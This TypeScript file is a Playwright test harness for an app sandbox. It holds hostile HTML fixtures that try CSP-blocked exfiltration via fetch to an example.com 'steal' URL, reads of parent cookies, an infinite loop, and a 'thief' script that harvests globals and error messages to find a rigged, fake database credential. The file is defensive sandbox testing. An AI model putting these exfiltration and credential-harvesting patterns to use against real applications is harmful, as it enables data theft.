/**
 * Browser harness for the Playwright tier. Bundled to an IIFE and loaded into
 * a real Chromium page; the spec drives it via `window.PoidHarness`.
 *
 * Each hostile app is a single-file document that attempts one attack and
 * reports the outcome to the parent via a `{ probe }` message — a channel
 * separate from the POID bridge (which ignores anything without `poid: 1`).
 */

import type { Capability } from "@poid/sdk";
import type { ConsentManifest } from "@poid/ui";
import {
  IdbSqlPersistence,
  makeSqlHandlers,
  mountReader,
  type ReaderHandle,
  type SqlHandlers,
} from "../src/index.js";

// Injected at bundle time: the @poid/sdk sandbox bootstrap, minified to an IIFE.
declare const __SDK_SOURCE__: string;

const HOSTILE_APPS: Record<string, string> = {
  // fetch() to any origin must be blocked by CSP (connect-src 'none'), not by
  // the SDK. The app has no poid.net (network not granted) and tries raw fetch.
  fetch: `<!doctype html><html><body><script>
    (async () => {
      try {
        await fetch("https://example.com/steal?data=secret");
        parent.postMessage({ probe: "fetch", blocked: false }, "*");
      } catch (e) {
        parent.postMessage({ probe: "fetch", blocked: true, detail: String(e) }, "*");
      }
    })();
  </script></body></html>`,

  // Escaping the sandbox: reading parent/top cross-origin must throw.
  escape: `<!doctype html><html><body><script>
    let blocked = false, detail = "";
    try { void parent.document.cookie; detail = "read parent.document"; }
    catch (e) { blocked = true; detail = String(e); }
    try { void top.location.href; } catch (e) { blocked = true; }
    parent.postMessage({ probe: "escape", blocked, detail }, "*");
  </script></body></html>`,

  // An app that hangs its event loop after load: the watchdog must trip.
  loop: `<!doctype html><html><body><script>
    parent.postMessage({ probe: "loop-start" }, "*");
    setTimeout(() => { while (true) {} }, 30);
  </script></body></html>`,

  // Positive control: the whole stack (bootstrap → bridge → broker → engine)
  // works in a real browser and a kv round-trip succeeds.
  good: `<!doctype html><html><body><script type="module">
    (async () => {
      try {
        await poid.db.kv.set("note", "hello");
        const v = await poid.db.kv.get("note");
        parent.postMessage({ probe: "kv", ok: v === "hello", value: v }, "*");
      } catch (e) {
        parent.postMessage({ probe: "kv", ok: false, detail: String(e) }, "*");
      }
    })();
  </script></body></html>`,

  // The Data Engine's document tier through the real sandbox → broker → SQL
  // engine path (M10): insert, query, then re-read what a prior run left.
  docs: `<!doctype html><html><body><script type="module">
    (async () => {
      try {
        const cards = poid.db.docs.collection("cards");
        const seenBefore = await cards.count({});
        await cards.insert({ title: "Ship M10", column: "doing", order: 1 });
        await cards.insert({ title: "Write docs", column: "todo", order: 2 });
        const doing = await cards.find({ column: "doing" });
        parent.postMessage({
          probe: "docs",
          ok: doing.length === 1 && doing[0].title === "Ship M10",
          total: await cards.count({}),
          seenBefore,
        }, "*");
      } catch (e) {
        parent.postMessage({ probe: "docs", ok: false, detail: String(e) }, "*");
      }
    })();
  </script></body></html>`,

  // The 10k-row perf check (M10 DoD): build the table, then time an indexed
  // point query — it must return in well under 50 ms.
  perf: `<!doctype html><html><body><script type="module">
    (async () => {
      try {
        await poid.db.sql.exec("CREATE TABLE items(id INTEGER PRIMARY KEY, tag TEXT, n INTEGER)");
        await poid.db.sql.exec("CREATE INDEX idx_tag ON items(tag)");
        await poid.db.sql.transaction(async (tx) => {
          await tx.exec(
            "WITH RECURSIVE s(v) AS (SELECT 1 UNION ALL SELECT v+1 FROM s WHERE v < 10000) " +
            "INSERT INTO items(id, tag, n) SELECT v, 'tag-' || (v % 100), v FROM s"
          );
        });
        const count = await poid.db.sql.exec("SELECT COUNT(*) AS n FROM items");
        const t0 = performance.now();
        const q = await poid.db.sql.exec("SELECT id, n FROM items WHERE tag = ? ORDER BY id", ["tag-42"]);
        const ms = performance.now() - t0;
        parent.postMessage({
          probe: "perf",
          ok: count.rows[0].n === 10000 && q.rows.length === 100,
          rows: q.rows.length,
          total: count.rows[0].n,
          ms,
        }, "*");
      } catch (e) {
        parent.postMessage({ probe: "perf", ok: false, detail: String(e) }, "*");
      }
    })();
  </script></body></html>`,

  // A POID whose whole purpose is to steal the connection credential (M11.5,
  // the milestone's Definition of Done). It sweeps every route a credential
  // could plausibly take out of the sandbox and reports one string; the spec
  // searches that string for the secret. The backend behind db.sql is rigged
  // to fail with an error that quotes the connection string, so this exercises
  // the realistic case rather than a hypothetical one.
  thief: `<!doctype html><html><body><script type="module">
    (async () => {
      const harvest = [];
      const capture = (label, value) => {
        try { harvest.push(label + "=" + JSON.stringify(value)); }
        catch (e) { harvest.push(label + "!" + String(e)); }
      };

      // 1. Identity: does app.info() name the backend behind storageMode?
      try { capture("info", await poid.app.info()); }
      catch (e) { capture("info-threw", String(e)); }

      // 2. A deliberately failing query. The backend's own message is where a
      //    connection string most often surfaces.
      let sqlError = null;
      try { await poid.db.sql.exec("SELECT * FROM definitely_not_a_table"); }
      catch (e) {
        sqlError = { name: e && e.name, code: e && e.code, message: String(e && e.message) };
        capture("sql-error", sqlError);
        capture("sql-stack", String((e && e.stack) || ""));
        capture("sql-own", Object.getOwnPropertyNames(e || {}).map((k) => k + ":" + String(e[k])));
      }

      // 3. The bootstrap the host injected, and anything else on the globals.
      try { capture("bootstrap", window.__POID_BOOTSTRAP__); } catch (e) { capture("bs", String(e)); }
      try { capture("globals", Object.getOwnPropertyNames(globalThis).join(",")); }
      catch (e) { capture("globals-threw", String(e)); }
      try { capture("poid-shape", Object.keys(poid)); } catch (e) { capture("ps", String(e)); }

      // 4. Anything reachable by walking the poid object one level deep.
      try {
        const deep = {};
        for (const k of Object.keys(poid)) {
          deep[k] = typeof poid[k] === "object" && poid[k] !== null ? Object.keys(poid[k]) : typeof poid[k];
        }
        capture("poid-deep", deep);
      } catch (e) { capture("deep-threw", String(e)); }

      // 5. The document the reader served us.
      try { capture("own-html", document.documentElement.outerHTML.slice(0, 4000)); }
      catch (e) { capture("html-threw", String(e)); }

      parent.postMessage({
        probe: "thief",
        harvest: harvest.join("\\n"),
        sqlError,
      }, "*");
    })();
  </script></body></html>`,
};

/**
 * The credential a connection would hold (M11.5). The harness plays the part
 * of a backend that quotes its connection string in an error — which real
 * drivers do — so the spec can prove the boundary stops it rather than
 * trusting that no backend ever misbehaves.
 */
const CONNECTION_SECRET = "postgres://app:sup3rs3cret-pw@db.example.com:5432/appdb";

interface Probe {
  probe: string;
  [k: string]: unknown;
}

const probes: Probe[] = [];
window.addEventListener("message", (ev) => {
  const d = ev.data as { probe?: unknown };
  if (d && typeof d === "object" && typeof d.probe === "string") probes.push(d as Probe);
});

const diagnostics: { method: string | null; code: string; detail: string }[] = [];

let current: ReaderHandle | undefined;
let sqlHandlers: SqlHandlers | undefined;

function stage(): HTMLElement {
  let s = document.getElementById("stage");
  if (!s) {
    s = document.createElement("div");
    s.id = "stage";
    document.body.append(s);
  }
  return s;
}

function manifest(): ConsentManifest & { instanceId: string; storageMode: "embedded" } {
  return {
    name: "Hostile Fixture",
    version: "1.0.0",
    author: "Attacker",
    signature: "none",
    instanceId: "instance-hostile",
    storageMode: "embedded",
    permissions: {
      network: [],
      filesystem: "none",
      clipboard: false,
      print: false,
      notifications: false,
      mcp: [],
    },
  };
}

interface MountArgs {
  kind: string;
  watchdog?: { intervalMs: number; timeoutMs: number };
  /** IndexedDB name for the SQL tier; a stable name across mounts models a
   * reader restart on the same instance's data. */
  sqlDb?: string;
  /** The instance id the session runs under (default `instance-hostile`). */
  instanceId?: string;
}

const PoidHarness = {
  // Kicks off the mount (which synchronously renders consent) but does NOT
  // await the consent decision — the spec clicks Run/Cancel separately.
  mount(args: MountArgs): void {
    probes.length = 0;
    current = undefined;
    const html = HOSTILE_APPS[args.kind];
    if (!html) throw new Error(`unknown hostile app ${args.kind}`);
    const files = new Map<string, Uint8Array>([["app/index.html", new TextEncoder().encode(html)]]);
    const capabilities: Capability[] = [
      "app",
      "db.kv",
      "db.sql",
      "db.docs",
      "db.slots",
      "ui",
      "export",
    ];
    const instanceId = args.instanceId ?? "instance-hostile";

    sqlHandlers = undefined;
    diagnostics.length = 0;
    void (async (): Promise<void> => {
      if (args.sqlDb) {
        sqlHandlers = makeSqlHandlers({
          wasm: { wasmUrl: "/wa-sqlite.wasm" },
          persistence: await IdbSqlPersistence.open(args.sqlDb),
        });
      }
      // A connection-backed SQL tier that fails the way a real driver does:
      // by quoting what it was given. Only the boundary stands between this
      // string and the application.
      const leakySql = async (): Promise<never> => {
        throw new Error(`FATAL: password authentication failed for "${CONNECTION_SECRET}"`);
      };
      const handlers = sqlHandlers
        ? { sql: sqlHandlers.sql, docs: sqlHandlers.docs }
        : args.kind === "thief"
          ? { sql: leakySql, docs: leakySql }
          : undefined;

      const handle = await mountReader({
        container: stage(),
        files,
        entry: "app/index.html",
        manifest: { ...manifest(), instanceId },
        capabilities,
        sdkSource: __SDK_SOURCE__,
        watchdog: args.watchdog,
        handlers,
        onDiagnostic: (entry) => diagnostics.push(entry),
      });
      current = handle;
    })();
  },
  /** Awaits the SQL tier's write-behind persists, so the next mount (a
   * "restart") is guaranteed to see committed data. */
  async flushSql(): Promise<void> {
    await sqlHandlers?.flush();
  },
  run(): void {
    document.querySelector<HTMLButtonElement>(".poid-consent__run")?.click();
  },
  cancel(): void {
    document.querySelector<HTMLButtonElement>(".poid-consent__cancel")?.click();
  },
  stop(): void {
    current?.stop();
  },
  probes(): Probe[] {
    return probes;
  },
  /** The credential the rigged backend holds, so a spec can search for it. */
  connectionSecret(): string {
    return CONNECTION_SECRET;
  },
  /** Refusal details the broker routed to the host instead of the app. */
  diagnostics(): { method: string | null; code: string; detail: string }[] {
    return diagnostics;
  },
  hasConsent(): boolean {
    return !!document.querySelector(".poid-consent");
  },
  hasIframe(): boolean {
    return !!stage().querySelector("iframe");
  },
  iframeSandbox(): string | null {
    return stage().querySelector("iframe")?.getAttribute("sandbox") ?? null;
  },
  isUnresponsive(): boolean {
    return !!document.querySelector(".poid-chrome--unresponsive");
  },
};

(window as unknown as { PoidHarness: typeof PoidHarness }).PoidHarness = PoidHarness;
